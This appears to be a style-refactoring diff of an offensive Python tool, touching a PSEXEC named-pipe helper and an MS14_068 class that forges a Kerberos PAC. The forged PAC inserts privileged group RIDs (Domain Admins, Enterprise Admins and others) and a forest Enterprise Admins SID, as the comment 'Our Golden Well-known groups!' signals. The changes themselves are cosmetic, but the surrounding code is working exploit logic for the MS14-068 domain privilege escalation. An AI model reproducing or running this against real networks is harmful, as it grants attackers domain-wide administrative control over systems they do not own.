@@ -218,22 +218,20 @@ class PSEXEC1:
     def openPipe(self, s, tid, pipe, accessMask):
         pipeReady = False
         tries = 50
-        while pipeReady is False and tries > 0:
+        while not pipeReady and tries > 0:
             try:
                 s.waitNamedPipe(tid,pipe)
                 pipeReady = True
             except:
                 tries -= 1
                 time.sleep(2)
-                pass
-
         if tries == 0:
             logging.critical('Pipe not ready, aborting')
             raise
 
-        fid = s.openFile(tid,pipe,accessMask, creationOption = 0x40, fileAttributes = 0x80)
-
-        return fid
+        return s.openFile(
+            tid, pipe, accessMask, creationOption=0x40, fileAttributes=0x80
+        )
 
 class Pipes(Thread):
     def __init__(self, transport, pipe, permissions, TGS=None, share=None):
@@ -462,10 +460,10 @@ class MS14_068:
         self.__writeTGT = writeTGT
         self.__domainSid = ''
         self.__forestSid = None
-        self.__domainControllers = list()
+        self.__domainControllers = []
         self.__kdcHost = kdcHost
 
-	hashes=None
+        hashes=None
         if hashes is not None:
             self.__lmhash, self.__nthash = hashes.split(':')
             self.__lmhash = unhexlify(self.__lmhash)
@@ -508,7 +506,7 @@ class MS14_068:
 
         kerbdata['PasswordCanChange']['dwLowDateTime']   = 0
         kerbdata['PasswordCanChange']['dwHighDateTime']  = 0
-        
+
         # PasswordMustChange: A FILETIME structure that contains the time at which
         # theclient's password expires. If the password will not expire, this 
         # structure MUST have the dwHighDateTime member set to 0x7FFFFFFF and the 
@@ -526,7 +524,7 @@ class MS14_068:
         kerbdata['BadPasswordCount']   = 0
         kerbdata['UserId']             = self.__rid
         kerbdata['PrimaryGroupId']     = 513
-        
+
         # Our Golden Well-known groups! :)
         groups = (513, 512, 520, 518, 519)
         kerbdata['GroupCount']         = len(groups)
@@ -558,13 +556,13 @@ class MS14_068:
         # asserted by an authentication authority based on proof of possession of client credentials.
         #extraSids = ('S-1-18-1',)
         if self.__forestSid is not None:
-            extraSids = ('%s-%s' % (self.__forestSid, '519'),)
+            extraSids = (f'{self.__forestSid}-519', )
             kerbdata['SidCount']          = len(extraSids)
             kerbdata['UserFlags'] |= 0x20
         else:
             extraSids = ()
             kerbdata['SidCount']          = len(extraSids)
-        
+
         for extraSid in extraSids:
             sidRecord = KERB_SID_AND_ATTRIBUTES()
             sid = RPC_SID()
@@ -576,7 +574,7 @@ class MS14_068:
         kerbdata['ResourceGroupDomainSid'] = NULL
         kerbdata['ResourceGroupCount'] = 0
         kerbdata['ResourceGroupIds'] = NULL
-            
+
         validationInfo = self.VALIDATION_INFO()
         validationInfo['Data'] = kerbdata
 
